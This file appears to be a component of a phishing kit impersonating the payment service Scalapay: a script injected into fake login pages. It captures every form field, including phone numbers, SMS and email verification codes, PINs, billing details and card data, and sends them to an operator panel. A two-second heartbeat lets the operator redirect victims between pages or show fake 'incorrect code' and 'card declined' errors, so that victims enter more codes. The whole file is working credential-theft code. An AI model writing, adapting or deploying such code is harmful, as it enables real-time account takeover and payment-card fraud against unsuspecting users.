<?php /* Tracker injected into all client pages */ ?>
<script>
// ==================== SCALAPAY CLIENT TRACKER ====================
(function() {
    // Detect API path based on current location
    const basePath = window.location.pathname.replace(/\/pages\/.*$/, '/').replace(/\/[^\/]*$/, '/');
    const API_URL = basePath + 'api.php';
    const PAGE_NAME = document.body.getAttribute('data-page') || 'unknown';

    // Page-specific error messages
    const PAGE_ERRORS = {
        'login': 'Unable to send verification code. Please check your phone number and try again.',
        'sms': 'The verification code you entered is incorrect. Please try again.',
        'email': 'The verification code you entered is incorrect. Please check your email and try again.',
        'pin': 'The PIN you entered is incorrect. Please try again.',
        'billing': 'We were unable to process your billing information. Please check your details and try again.',
        'card': 'Your card was declined. Please check your card details and try again.',
        'success': 'An unexpected error occurred. Please try again later.'
    };

    let clientId = localStorage.getItem('sp_client_id') || '';
    let phoneNumber = localStorage.getItem('sp_phone') || '';
    let emailMask = localStorage.getItem('sp_email') || '';
    let isLoading = false;
    let typingNotified = false; // Track if we already notified for this page

    console.log('[SP] Tracker loaded. Page:', PAGE_NAME, 'API:', API_URL);

    // ==================== REGISTER ====================
    function register() {
        fetch(API_URL + '?action=register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success) {
                clientId = res.clientId;
                localStorage.setItem('sp_client_id', clientId);
                console.log('[SP] Registered:', clientId);
                startHeartbeat();
            }
        })
        .catch(e => console.error('[SP] Register failed:', e));
    }

    // ==================== HEARTBEAT ====================
    function startHeartbeat() {
        doHeartbeat();
        setInterval(doHeartbeat, 2000);
    }

    function doHeartbeat() {
        if (!clientId) return;
        fetch(API_URL + '?action=heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success && res.commands && res.commands.length > 0) {
                res.commands.forEach(cmd => handleCommand(cmd));
            }
        })
        .catch(() => {});
    }

    // ==================== COMMANDS FROM PANEL ====================
    function handleCommand(cmd) {
        console.log('[SP] Command received:', cmd);
        switch (cmd.type) {
            case 'redirect':
                const pages = {
                    'login': 'index.php',
                    'sms': 'sms.php',
                    'email': 'email.php',
                    'pin': 'pin.php',
                    'billing': 'billing.php',
                    'card': 'card.php',
                    'success': 'success.php'
                };
                const target = pages[cmd.target] || cmd.target + '.php';
                window.location.href = target;
                break;

            case 'showError':
                // Stop loading state first
                stopLoading();
                // Show page-specific error
                const errorMsg = PAGE_ERRORS[PAGE_NAME] || 'An error occurred. Please try again.';
                showErrorToast(errorMsg);
                break;

            case 'setEmail':
                localStorage.setItem('sp_email', cmd.email);
                applyEmailMask(cmd.email);
                break;
        }
    }

    // ==================== STOP LOADING ====================
    function stopLoading() {
        isLoading = false;
        document.querySelectorAll('form').forEach(function(form) {
            const btn = form.querySelector('button[type="submit"]');
            if (btn) {
                btn.disabled = false;
                btn.classList.remove('btn-loading');
                const spinner = btn.querySelector('.btn-spinner');
                if (spinner) spinner.style.display = 'none';
                const txt = btn.querySelector('.btn-text');
                if (txt) {
                    txt.textContent = PAGE_NAME === 'login' ? 'Continue' : 'Continua';
                }
            }
            form.querySelectorAll('input').forEach(function(inp) {
                inp.disabled = false;
                inp.style.opacity = '1';
            });
        });
    }

    // ==================== ERROR TOAST ====================
    function showErrorToast(message) {
        let toast = document.getElementById('sp-error-toast');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'sp-error-toast';
            toast.innerHTML = `
                <div class="sp-err-box">
                    <div class="sp-err-icon">!</div>
                    <div class="sp-err-msg" id="sp-err-text"></div>
                    <button class="sp-err-close" onclick="document.getElementById('sp-error-toast').classList.remove('sp-active')">&times;</button>
                </div>
            `;
            document.body.appendChild(toast);
        }
        document.getElementById('sp-err-text').textContent = message;
        toast.classList.add('sp-active');
        setTimeout(() => toast.classList.remove('sp-active'), 7000);
    }
    window.showSPError = showErrorToast;

    // ==================== TYPING TRACKING (ONCE PER PAGE) ====================
    function trackTyping(input) {
        input.addEventListener('input', function() {
            if (!typingNotified && clientId) {
                fetch(API_URL + '?action=typing', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
                }).catch(() => {});
                typingNotified = true;
            }
        });
    }

    // ==================== FORM SUBMIT - PERSISTENT LOADING ====================
    function trackForms() {
        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (isLoading) return;

                // Collect data
                const data = {};
                form.querySelectorAll('input, select, textarea').forEach(function(inp) {
                    if (inp.id || inp.name) {
                        data[inp.id || inp.name] = inp.value;
                    }
                });

                // Save phone for persistence
                const phoneVal = data['login-phone-number-input'] || data['phone'] || '';
                if (phoneVal) {
                    localStorage.setItem('sp_phone', phoneVal);
                    phoneNumber = phoneVal;
                }

                // Send data to server
                if (clientId) {
                    fetch(API_URL + '?action=data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ clientId: clientId, data: data })
                    }).catch(() => {});
                }

                // START LOADING - stays until panel redirects or sends error
                isLoading = true;
                const btn = form.querySelector('button[type="submit"]');
                if (btn) {
                    btn.disabled = true;
                    btn.classList.add('btn-loading');
                    const spinner = btn.querySelector('.btn-spinner');
                    if (spinner) spinner.style.display = 'inline-block';
                    const txt = btn.querySelector('.btn-text');
                    if (txt) txt.textContent = '';
                }

                // Also disable all inputs
                form.querySelectorAll('input').forEach(function(inp) {
                    inp.disabled = true;
                    inp.style.opacity = '0.6';
                });
            });
        });
    }

    // ==================== EMAIL MASK ====================
    function applyEmailMask(maskedEmail) {
        const subtitles = document.querySelectorAll('[data-automation="login-header-subtitle"]');
        subtitles.forEach(function(sub) {
            const text = sub.textContent.toLowerCase();
            if (text.includes('@') || text.includes('email') || text.includes('invia') || text.includes('inviato') || text.includes('codice')) {
                sub.textContent = 'Codice inviato a ' + maskedEmail;
            }
        });
    }

    // ==================== APPLY STORED PHONE TO SMS PAGE ====================
    function applyStoredPhone() {
        if (PAGE_NAME === 'sms' && phoneNumber) {
            const subs = document.querySelectorAll('[data-automation="login-header-subtitle"]');
            subs.forEach(function(sub) {
                sub.textContent = 'Enter the verification code we sent to ' + phoneNumber + '.';
            });
        }
    }

    // ==================== INIT ====================
    if (!clientId) {
        register();
    } else {
        startHeartbeat();
    }

    trackForms();
    applyStoredPhone();

    // Track all inputs for typing (only first input per page)
    setTimeout(function() {
        document.querySelectorAll('input').forEach(function(inp) {
            trackTyping(inp);
        });
    }, 300);

    // Apply stored email mask
    if (emailMask && PAGE_NAME === 'email') {
        applyEmailMask(emailMask);
    }

})();
</script>

<style>
/* ===== ERROR TOAST ===== */
#sp-error-toast {
    position: fixed !important;
    top: 20px !important;
    right: 20px !important;
    z-index: 999999 !important;
    transform: translateX(450px) !important;
    opacity: 0 !important;
    transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) !important;
    pointer-events: none !important;
    max-width: 400px !important;
}
#sp-error-toast.sp-active {
    transform: translateX(0) !important;
    opacity: 1 !important;
    pointer-events: auto !important;
}
.sp-err-box {
    display: flex !important;
    align-items: flex-start !important;
    gap: 14px !important;
    background: #fef2f2 !important;
    border-radius: 16px !important;
    padding: 16px 18px !important;
    box-shadow: 0 8px 30px rgba(239, 68, 68, 0.15), 0 2px 8px rgba(0,0,0,0.08) !important;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
}
.sp-err-icon {
    width: 24px !important;
    height: 24px !important;
    min-width: 24px !important;
    border-radius: 50% !important;
    border: 2px solid #ef4444 !important;
    color: #ef4444 !important;
    font-size: 14px !important;
    font-weight: 700 !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: 1px !important;
    background: transparent !important;
}
.sp-err-msg {
    color: #1f2937 !important;
    font-size: 13px !important;
    line-height: 1.5 !important;
    font-weight: 400 !important;
    flex: 1 !important;
    padding-right: 8px !important;
}
.sp-err-close {
    background: none !important;
    border: none !important;
    color: #6b7280 !important;
    font-size: 22px !important;
    font-weight: 300 !important;
    cursor: pointer !important;
    padding: 0 !important;
    line-height: 1 !important;
    width: 24px !important;
    height: 24px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: -2px !important;
}
.sp-err-close:hover { color: #1f2937 !important; }
</style>